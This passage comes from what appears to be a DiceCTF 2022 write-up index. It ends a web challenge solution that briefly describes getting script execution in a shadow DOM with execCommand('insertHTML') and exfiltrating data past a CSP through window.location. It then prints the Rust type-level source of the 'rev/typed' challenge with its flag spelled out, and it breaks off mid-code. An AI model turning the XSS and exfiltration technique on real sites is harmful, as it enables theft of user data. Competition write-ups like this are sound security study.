<code>document.execCommand(\"insertHTML\",\"payload\")</code> to write HTML inside it and get code execution inside the shadowDOM context.</p> <p>We can easily exfiltrate despite the CSP by setting <code>window.location</code></p>"},{"location":"Writeup/DiceCTF%202022/#revtyped","title":"rev/typed","text":"<p>Here's the original version of the code before macro expansion (and with the flag added in):</p> <pre><code>#![recursion_limit = \"10000\"]\n// #![allow(dead_code, unused_macros)]\n\nuse std::marker::PhantomData;\n\nmacro_rules! mktype {\n    ($name: ident) =&gt; {\n        struct $name;\n    };\n\n    ($name: ident&lt;$($t: ident),*&gt;) =&gt; {\n        struct $name&lt;$($t),*&gt;($(PhantomData&lt;$t&gt;),*);\n    }\n}\n\nmacro_rules! mktrait {\n    ($name: ident) =&gt; {\n        trait $name {\n            type Output;\n        }\n    };\n    ($name: ident&lt;$($arg: ident),*&gt;) =&gt; {\n        trait $name&lt;$($arg),*&gt; {\n            type Output;\n        }\n    }\n}\n\nmacro_rules! mkimpl {\n    ($name: ident&lt;$($gen: ident),*&gt;[$($cgen: ty : $cons: path),*]($firstarg: ty $(, $arg: ty)*) = $output: ty) =&gt; {\n        impl&lt;$($gen),*&gt; $name&lt;$($arg),*&gt; for $firstarg\n        where\n            $($cgen: $cons),*\n        {\n            type Output = $output;\n        }\n    }\n}\n\nmacro_rules! mkout {\n    ($name: ident, $firstarg: ty $(, $arg: ty)*) =&gt; {\n        &lt;$firstarg as $name&lt;$($arg),*&gt;&gt;::Output\n    }\n}\n\nmktype!(S&lt;T&gt;);\nmktype!(Z);\nmktrait!(Add&lt;O&gt;);\nmkimpl!(Add&lt;T&gt;[](T, Z) = T);\nmkimpl!(Add&lt;T, K&gt;[T: Add&lt;K&gt;](T, S&lt;K&gt;) = S&lt;mkout!(Add, T, K)&gt;);\nmktrait!(Mul&lt;O&gt;);\nmkimpl!(Mul&lt;T&gt;[](T, Z) = Z);\nmkimpl!(Mul&lt;T, K&gt;[T: Mul&lt;K&gt;, T: Add&lt;mkout!(Mul, T, K)&gt;](T, S&lt;K&gt;) = mkout!(Add, T, mkout!(Mul, T, K)));\nmktrait!(Sub&lt;O&gt;);\nmkimpl!(Sub&lt;T&gt;[](T, Z) = T);\nmkimpl!(Sub&lt;T, K&gt;[T: Sub&lt;K&gt;](S&lt;T&gt;, S&lt;K&gt;) = mkout!(Sub, T, K));\nmktrait!(Neq&lt;O&gt;);\nmkimpl!(Neq&lt;&gt;[](Z, Z) = Z);\nmkimpl!(Neq&lt;T&gt;[](S&lt;T&gt;, Z) = S&lt;Z&gt;);\nmkimpl!(Neq&lt;T&gt;[](Z, S&lt;T&gt;) = S&lt;Z&gt;);\nmkimpl!(Neq&lt;T, K&gt;[T: Neq&lt;K&gt;](S&lt;T&gt;, S&lt;K&gt;) = mkout!(Neq, T, K));\n\nmktype!(Nil);\nmktype!(Cons&lt;H, T&gt;);\n\nmacro_rules! mklist {\n    () =&gt; { Nil };\n    ($first: ty $(, $rest: ty)*) =&gt; {\n        Cons&lt;$first, mklist!($($rest),*)&gt;\n    }\n}\n\nmacro_rules! mkcons {\n    ($first: ty) =&gt; { $first };\n    ($first: ty $(, $rest: ty)*) =&gt; {\n        Cons&lt;$first, mkcons!($($rest),*)&gt;\n    }\n}\n\nmktrait!(Eval);\n\nmacro_rules! mkfunc {\n    ($name: ident) =&gt; {\n        mktype!($name);\n        mkimpl!(Eval&lt;&gt;[]($name) = $name);\n    }\n}\n\nmkfunc!(AddFunc);\nmkfunc!(MulFunc);\nmkfunc!(SubFunc);\nmkfunc!(ConsFunc);\nmkfunc!(RawList);\nmkfunc!(GetLast);\nmkfunc!(AssertEq);\nmkfunc!(AssertNeq);\nmkfunc!(MapFunc);\nmkfunc!(MkConstraint);\nmkfunc!(MkNConstraint);\nmkfunc!(FirstOf3);\nmkfunc!(RestOf3);\nmkfunc!(ApplyFunc);\n\nmkimpl!(Eval&lt;&gt;[](Z) = Z);\nmkimpl!(Eval&lt;T&gt;[](S&lt;T&gt;) = S&lt;T&gt;);\nmkimpl!(Eval&lt;&gt;[](Cons&lt;RawList, Nil&gt;) = Nil);\nmkimpl!(Eval&lt;H, T&gt;[H: Eval](Cons&lt;RawList, Cons&lt;H, T&gt;&gt;) = Cons&lt;mkout!(Eval, H), T&gt;);\nmkimpl!(\n    Eval&lt;A, B&gt;[A: Eval, B: Eval, mkout!(Eval, A): Sub&lt;mkout!(Eval, B)&gt;](mklist!(SubFunc, A, B)) =\n        mkout!(Sub, mkout!(Eval, A), mkout!(Eval, B))\n);\nmkimpl!(Eval&lt;T&gt;[T: Eval](Cons&lt;GetLast, mklist!(T)&gt;) = mkout!(Eval, T));\nmkimpl!(\n    Eval&lt;T, K, R&gt;[mkcons!(GetLast, K, R): Eval, T: Eval](mkcons!(GetLast, T, K, R)) =\n        mkout!(Eval, mkcons!(GetLast, K, R))\n);\nmkimpl!(Eval&lt;T&gt;[](Cons&lt;AssertEq, mklist!(T)&gt;) = Z);\nmkimpl!(\n    Eval&lt;T, K, R&gt;\n        [T: Eval, K: Eval, mkout!(Eval, T): Sub&lt;mkout!(Eval, K)&gt;, mkout!(Eval, K): Sub&lt;mkout!(Eval, T)&gt;, mkcons!(AssertEq, K, R): Eval]\n        (mkcons!(AssertEq, T, K, R)) =\n        mkout!(Eval, mkcons!(AssertEq, K, R))\n);\nmkimpl!(\n    Eval&lt;T, K&gt;\n        [T: Eval, K: Eval, mkout!(Eval, T): Neq&lt;mkout!(Eval, K)&gt;, mkout!(Neq, mkout!(Eval, T), mkout!(Eval, K)): Sub&lt;S&lt;Z&gt;&gt;]\n        (Cons&lt;AssertNeq, mklist!(T, K)&gt;) =\n        Z\n);\nmkimpl!(Eval&lt;F&gt;[](mklist!(MapFunc, F)) = Nil);\nmkimpl!(\n    Eval&lt;F, H, T&gt;\n        [mklist!(F, H): Eval, mkcons!(MapFunc, F, T): Eval]\n        (mkcons!(MapFunc, F, H, T)) =\n        Cons&lt;mkout!(Eval, mklist!(F, H)), mkout!(Eval, mkcons!(MapFunc, F, T))&gt;\n);\nmkimpl!(Eval&lt;F, A, B, T&gt;[](mklist!(MkConstraint, mklist!(F, A, B, T))) = mklist!(AssertEq, mklist!(F, A, B), T));\nmkimpl!(Eval&lt;F, A, B, T&gt;[](mklist!(MkNConstraint, mklist!(F, A, B, T))) = mklist!(AssertNeq, mklist!(F, A, B), T));\nmkimpl!(Eval&lt;&gt;[](mklist!(FirstOf3)) = Nil);\nmkimpl!(Eval&lt;A, B, C, T&gt;[Cons&lt;FirstOf3, T&gt;: Eval](mkcons!(FirstOf3, A, B, C, T)) = Cons&lt;A, mkout!(Eval, Cons&lt;FirstOf3, T&gt;)&gt;);\nmkimpl!(Eval&lt;&gt;[](mklist!(RestOf3)) = Nil);\nmkimpl!(Eval&lt;A, B, C, T&gt;[Cons&lt;RestOf3, T&gt;: Eval](mkcons!(RestOf3, A, B, C, T)) = mkcons!(B, C, mkout!(Eval, Cons&lt;RestOf3, T&gt;)));\nmkimpl!(\n    Eval&lt;F, T&gt;[T: Eval, Cons&lt;F, mkout!(Eval, T)&gt;: Eval](mklist!(ApplyFunc, F, T)) =\n        mkout!(Eval, Cons&lt;F, mkout!(Eval, T)&gt;)\n);\nmkimpl!(Eval&lt;T&gt;[T: Eval](mklist!(ConsFunc, T)) = mkout!(Eval, T));\nmkimpl!(Eval&lt;H, T&gt;[Cons&lt;ConsFunc, T&gt;: Eval](mkcons!(ConsFunc, H, T)) = Cons&lt;H, mkout!(Eval, Cons&lt;ConsFunc, T&gt;)&gt;);\n\nmacro_rules! mkfold {\n    ($fc: ident, $f: ident, $empty: ty, [$t: ident] $one: ty) =&gt; {\n        mkimpl!(Eval&lt;&gt;[](mklist!($fc)) = $empty);\n        mkimpl!(Eval&lt;$t&gt;[$t: Eval](mklist!($fc, $t)) = $one);\n        mkimpl!(\n            Eval&lt;H1, H2, T&gt;\n            [H2: Eval, H1: $f&lt;mkout!(Eval, H2)&gt;, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T): Eval]\n            (Cons&lt;$fc, Cons&lt;H1, Cons&lt;H2, T&gt;&gt;&gt;)\n            = mkout!(Eval, mkcons!($fc, mkout!($f, H1, mkout!(Eval, H2)), T))\n        );\n    }\n}\n\nmkfold!(AddFunc, Add, Z, [T] T);\nmkfold!(MulFunc, Mul, S&lt;Z&gt;, [T] T);\n\ntype Ten = S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;\ntype Hundred = mkout!(Mul, Ten, Ten);\n\ntrait AsChar { const CHAR: char; }\ntype Char_ = Z;\nimpl AsChar for Char_ { const CHAR: char = '_'; }\ntype Char0 = S&lt;Z&gt;;\nimpl AsChar for Char0 { const CHAR: char = '0'; }\ntype Char1 = S&lt;S&lt;Z&gt;&gt;;\nimpl AsChar for Char1 { const CHAR: char = '1'; }\ntype Char2 = S&lt;S&lt;S&lt;Z&gt;&gt;&gt;;\nimpl AsChar for Char2 { const CHAR: char = '2'; }\ntype Char3 = S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;;\nimpl AsChar for Char3 { const CHAR: char = '3'; }\ntype Char4 = S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;;\nimpl AsChar for Char4 { const CHAR: char = '4'; }\ntype Char5 = S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;;\nimpl AsChar for Char5 { const CHAR: char = '5'; }\ntype Char6 = S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;;\nimpl AsChar for Char6 { const CHAR: char = '6'; }\ntype Char7 = S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;\nimpl AsChar for Char7 { const CHAR: char = '7'; }\ntype Char8 = S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;\nimpl AsChar for Char8 { const CHAR: char = '8'; }\ntype Char9 = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), Z);\nimpl AsChar for Char9 { const CHAR: char = '9'; }\ntype CharA = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;Z&gt;);\nimpl AsChar for CharA { const CHAR: char = 'a'; }\ntype CharB = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;Z&gt;&gt;);\nimpl AsChar for CharB { const CHAR: char = 'b'; }\ntype CharC = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;);\nimpl AsChar for CharC { const CHAR: char = 'c'; }\ntype CharD = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;);\nimpl AsChar for CharD { const CHAR: char = 'd'; }\ntype CharE = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharE { const CHAR: char = 'e'; }\ntype CharF = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharF { const CHAR: char = 'f'; }\ntype CharG = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharG { const CHAR: char = 'g'; }\ntype CharH = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharH { const CHAR: char = 'h'; }\ntype CharI = mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharI { const CHAR: char = 'i'; }\ntype CharJ = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), Z);\nimpl AsChar for CharJ { const CHAR: char = 'j'; }\ntype CharK = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;Z&gt;);\nimpl AsChar for CharK { const CHAR: char = 'k'; }\ntype CharL = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;Z&gt;&gt;);\nimpl AsChar for CharL { const CHAR: char = 'l'; }\ntype CharM = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;);\nimpl AsChar for CharM { const CHAR: char = 'm'; }\ntype CharN = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;);\nimpl AsChar for CharN { const CHAR: char = 'n'; }\ntype CharO = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharO { const CHAR: char = 'o'; }\ntype CharP = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharP { const CHAR: char = 'p'; }\ntype CharQ = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharQ { const CHAR: char = 'q'; }\ntype CharR = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharR { const CHAR: char = 'r'; }\ntype CharS = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharS { const CHAR: char = 's'; }\ntype CharT = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), Z);\nimpl AsChar for CharT { const CHAR: char = 't'; }\ntype CharU = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;Z&gt;);\nimpl AsChar for CharU { const CHAR: char = 'u'; }\ntype CharV = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;Z&gt;&gt;);\nimpl AsChar for CharV { const CHAR: char = 'v'; }\ntype CharW = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;);\nimpl AsChar for CharW { const CHAR: char = 'w'; }\ntype CharX = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;);\nimpl AsChar for CharX { const CHAR: char = 'x'; }\ntype CharY = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharY { const CHAR: char = 'y'; }\ntype CharZ = mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;);\nimpl AsChar for CharZ { const CHAR: char = 'z'; }\ntype Flag0 = CharL;\ntype Flag1 = Char1;\ntype Flag2 = CharS;\ntype Flag3 = CharP;\ntype Flag4 = Char_;\ntype Flag5 = CharI;\ntype Flag6 = CharN;\ntype Flag7 = CharS;\ntype Flag8 = CharI;\ntype Flag9 = CharD;\ntype Flag10 = Char3;\ntype Flag11 = Char_;\ntype Flag12 = CharR;\ntype Flag13 = CharU;\ntype Flag14 = CharS;\ntype Flag15 = Char7;\ntype Flag16 = Char_;\ntype Flag17 = Char9;\ntype Flag18 = CharA;\ntype Flag19 = CharF;\ntype Flag20 = CharH;\ntype Flag21 = Char1;\ntype Flag22 = CharN;\ntype Flag23 = Char2;\ntype Flag24 = Char3;\ntype Constraints = mklist!(mklist!(AddFunc, Flag11, Flag13, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag1, Flag9, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag20, Flag4, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(SubFunc, Flag3, Flag16, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag12, Flag11, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag18, Flag17, Z), mklist!(MulFunc, Flag20, Flag11, Z), mklist!(SubFunc, Flag5, Flag9, S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;), mklist!(MulFunc, Flag2, Flag4, S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;), mklist!(SubFunc, Flag0, Flag15, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag8, Flag24, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag11, Flag7, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(SubFunc, Flag14, Flag21, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag4, Flag16, Z), mklist!(MulFunc, Flag21, Flag3, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag24, Flag16, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), mklist!(SubFunc, Flag3, Flag0, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), mklist!(AddFunc, Flag11, Flag10, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(SubFunc, Flag7, Flag15, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;Z&gt;)), mklist!(AddFunc, Flag18, Flag5, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), Z)), mklist!(MulFunc, Flag18, Flag11, S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;), mklist!(SubFunc, Flag7, Flag21, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag13, Flag18, mkout!(Add, mkout!(Mul, Hundred, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;Z&gt;))), mklist!(SubFunc, Flag20, Flag15, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(SubFunc, Flag19, Flag23, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(AddFunc, Flag14, Flag20, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag21, Flag4, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), Z)), mklist!(AddFunc, Flag10, Flag2, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), S&lt;S&lt;S&lt;Z&gt;&gt;&gt;)), mklist!(SubFunc, Flag20, Flag10, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag17, Flag0, mkout!(Add, mkout!(Mul, Hundred, S&lt;S&lt;Z&gt;&gt;), mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;))), mklist!(SubFunc, Flag22, Flag23, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;Z&gt;)), mklist!(MulFunc, Flag15, Flag18, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag12, Flag6, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag22, Flag24, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag0, Flag23, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag0, Flag5, mkout!(Add, mkout!(Mul, Hundred, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag8, Flag11, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag19, Flag13, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag7, Flag12, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;Z&gt;)), mklist!(MulFunc, Flag17, Flag22, mkout!(Add, mkout!(Mul, Hundred, S&lt;S&lt;Z&gt;&gt;), mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), Z))), mklist!(AddFunc, Flag16, Flag14, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag24, Flag18, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag19, Flag4, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag24, Flag3, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;Z&gt;&gt;&gt;), Z)), mklist!(SubFunc, Flag0, Flag16, mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;Z&gt;&gt;)), mklist!(MulFunc, Flag10, Flag5, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag20, Flag19, S&lt;S&lt;Z&gt;&gt;), mklist!(MulFunc, Flag12, Flag16, S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;), mklist!(MulFunc, Flag24, Flag12, mkout!(Add, mkout!(Mul, Hundred, S&lt;Z&gt;), mkout!(Add, mkout!(Mul, Ten, S&lt;Z&gt;), S&lt;S&lt;Z&gt;&gt;))), mklist!(SubFunc, Flag24, Flag16, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), mklist!(AddFunc, Flag12, Flag15, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag1, Flag20, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), Z)), mklist!(MulFunc, Flag1, Flag17, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), Z)), mklist!(AddFunc, Flag5, Flag11, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(SubFunc, Flag5, Flag18, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;), mklist!(AddFunc, Flag16, Flag22, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;Z&gt;&gt;), S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;)), mklist!(MulFunc, Flag14, Flag3, mkout!(Add, mkout!(Mul, Hundred, S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;), mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;))), mklist!(MulFunc, Flag6, Flag21, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), 